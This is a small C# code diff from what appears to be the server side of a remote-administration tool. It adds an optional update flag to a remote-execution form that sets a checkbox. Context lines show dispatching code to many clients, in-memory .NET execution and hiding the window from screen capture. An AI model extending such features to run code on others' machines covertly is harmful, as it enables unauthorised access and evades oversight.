@@ -36,12 +36,14 @@ namespace Pulsar.Server.Forms
         private bool _isUpdate;
         private bool _executeInMemoryDotNet;
 
-        public FrmRemoteExecution(Client[] clients)
+        public FrmRemoteExecution(Client[] clients, bool Updating = false)
         {
             _clients = clients;
             _remoteExecutionMessageHandlers = new List<RemoteExecutionMessageHandler>(clients.Length);
 
             InitializeComponent();
+
+            chkUpdate.Checked = Updating;
 
             DarkModeManager.ApplyDarkMode(this);
 			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
